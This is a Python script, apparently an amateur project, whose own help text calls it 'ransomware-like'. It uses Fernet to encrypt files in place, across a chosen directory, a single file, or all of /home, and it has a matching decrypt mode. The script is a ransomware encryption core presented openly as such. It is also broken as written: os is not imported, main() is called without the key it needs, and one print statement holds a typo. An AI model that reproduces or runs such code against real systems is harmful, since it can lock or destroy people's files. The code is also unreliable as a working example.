import sys
from cryptography.fernet import Fernet
import argparse

# #total argument should be two , scrpit_name + one argument
# if len(sys.argv) == 2:
# 	script_name = sys.argv[0]
# 	operation = sys.argv[1]

# 	if operation.lower() == "encrypt":
# 		print("operation : encrypt")
# 	elif operation.lower() == "decrypt":
# 		with open("encrytion_key.key" , "rb") as keyFile:
# 			key = keyFile.read()
# 		decryptDir("../target_dir",key)
# 		print("operation : decrypt")
# 	else:
# 		print("Invalid operation. Please use 'encrypt' or 'decrypt'.")
# else:
# 	print("Please provide exactly one command line argument.")

def main(key):
	parser = argparse.ArgumentParser(description="Example script with ransomware-like command-line arguments.")

	group = parser.add_mutually_exclusive_group()
	group.add_argument("-a", "--all", action="store_true", help="Perform the operation on all directories.")
	group.add_argument("-d", "--directory", metavar="DIRECTORY_PATH", help="Perform the operation on a specific directory.")
	group.add_argument("-f", "--file", metavar="FILE_PATH", help="Perform the operation on a specific file.")

	# Add an argument for operation (encrypt/decrypt)
	parser.add_argument("-en", "--encrypt", action="store_true", help="Encrypt the data.")
	parser.add_argument("-de", "--decrypt", action="store_true", help="Decrypt the data.")

	args = parser.parse_args()

	if args.encrypt:
		print("User passed -en or --encrypt")
		if args.all:
			encrypt_directory("/home", key)
			print("ALL FILES ARE ENCRYPTED")
		elif args.directory:
			encrypt_directory(f"{args.directory}", key)
			print(f"DIRECTORY {args.directory} IS ENCRYPTED")
		elif args.file:
			encrypt_specific_file(f"{args.file}", key)
			print(f"{args.file} IS ENCRYPTED")
		else:
			print("Invalid usage. Use -a, -d <DIRECTORY_PATH>, or -f <FILE_PATH>.")

	elif args.decrypt:
		print("User passed -de or --decrypt")
		if args.all:
			decrypt_directory("/home", key)
			print("ALL FILES ARE DECRYPTED")
		elif args.directory:
			decrypt_directory(f"{args.directory}", key)
			print(f"DIRECTORY {arge.directory} IS DECRYPTED", key)
		elif args.file:
			decrypt_specific_file(f"{args.file}", key)
			print(f"{args.file} IS DECRYPTED")
		else:
			print("Invalid usage. Use -a, -d <DIRECTORY_PATH>, or -f <FILE_PATH>.")
	else:
		print("No operation specified. Use -en or -de.")


def encrypt_specific_file(file,key):
	with open(file, "rb") as specifiedFile:
		data = specifiedFile.read()
	encrypted_data = Fernet(key).encrypt(data)

	with open(file, "wb") as encryptedFile:
		encryptedFile.write(encrypted_data)


def encrypt_directory(path, key):
	for root, dirs, files in os.walk(path):
		for file in files:
			file_path = os.path.join(root, file)
			encrypt_specific_file(file_path, key)


def decrypt_specific_file(file,key):
	with open(file, "rb") as specifiedFile:
		data = specifiedFile.read()
	decrypted_data = Fernet(key).decrypt(data)

	with open(file, "wb") as encryptedFile:
		encryptedFile.write(decrypted_data)

def decrypt_directory(path,key):
	for root, dirs, files in os.walk(path):
		for file in files:
			file_path = os.path.join(root,file)
			decrypt_specific_file(file_path,key)

if __name__ == "__main__":
	main()
